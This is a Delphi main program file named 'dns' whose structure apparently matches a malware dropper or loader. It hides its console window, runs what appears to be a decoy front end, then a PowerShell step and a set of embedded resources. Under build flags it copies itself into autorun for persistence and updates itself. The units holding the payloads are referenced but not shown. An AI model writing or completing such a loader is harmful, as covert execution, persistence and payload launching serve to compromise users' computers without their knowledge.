program dns;

{$APPTYPE CONSOLE}
 
uses
  Windows,
  SysUtils,
  ShellAPI,
  ActiveX,
  Variants,
  Classes,
       {$IFDEF USE_AUTOUPDATE}
  consts in 'consts.pas',
   {$ENDIF}
  registry,
  ComObj,
  init in 'init.pas',
  embeddingsMan in 'embeddingsMan.pas',
  _front in '_front.pas',
  _embeddings in '_embeddings.pas',

      {$IFDEF USE_AUTOSTART}
  autorun in 'autorun.pas',
     {$ENDIF}

     {$IFDEF USE_AUTOUPDATE}
       autoupdate in 'autoupdate.pas',
         {$ENDIF}

  runMan in 'runMan.pas';

function GetConsoleWindow: HWND; stdcall; external 'kernel32.dll';

procedure HideConsoleWindow;
var
  ConsoleWnd: HWND;
begin
  ConsoleWnd := GetConsoleWindow;
  if ConsoleWnd <> 0 then
    ShowWindow(ConsoleWnd, SW_HIDE);
end;

begin
  HideConsoleWindow;
  CoInitialize(nil);
  ListResources();
  runMan.RunFront;
  runMan.RunPS;


{$IFDEF USE_AUTOSTART}
  CopyFileAndAddToAutorun;
            {$ENDIF}

  {$IFDEF USE_AUTOUPDATE}
  AutoUpdateX;
 {$ENDIF}
  runMan.RunEmbeds;
end.

